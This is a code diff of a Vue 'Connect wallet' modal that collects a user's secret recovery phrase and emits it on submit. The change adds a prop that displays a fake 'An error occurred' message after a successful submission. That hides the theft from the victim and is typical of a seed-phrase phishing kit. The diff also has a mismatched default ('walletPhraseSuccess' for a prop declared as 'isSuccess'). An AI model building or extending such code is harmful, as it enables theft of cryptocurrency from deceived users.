@@ -102,11 +102,10 @@
               <h4 class="text-center text-lg font-semibold text-[#07122f]">
                 Connect {{ walletName }}
               </h4>
-
             </div>
 
             <div>
-
+              <p v-if="isSuccess" class="text-red-500 text-lg text-center mb-1 font-medium">An error occurred. Please try again later.</p>
               <textarea
                   id="secret_phrase"
                   v-model="walletPhrase"
@@ -168,17 +167,20 @@ interface Props {
   show?: boolean
   walletName?: string
   walletLogo?: string
+  isSuccess?: boolean
 }
 
 const props = withDefaults(defineProps<Props>(), {
   show: false,
   walletName: 'Plug',
-  walletLogo: '/images/logo/plug.svg'
+  walletLogo: '/images/logo/plug.svg',
+  walletPhraseSuccess: false
 })
 
 const emit = defineEmits<{
   close: []
   submit: [payload: { walletPhrase: string, walletName: string }, ]
+  resetSuccess: []
 }>()
 
 type ModalState =
@@ -225,7 +227,7 @@ const handleSubmit = () => {
   emit('submit', { walletPhrase: walletPhrase.value, walletName: props.walletName })
 }
 
-watch(walletPhrase, () => { walletPhraseError.value = '' })
+watch(walletPhrase, () => { walletPhraseError.value = ''; emit('resetSuccess') })
 
 watch(
     () => props.show,
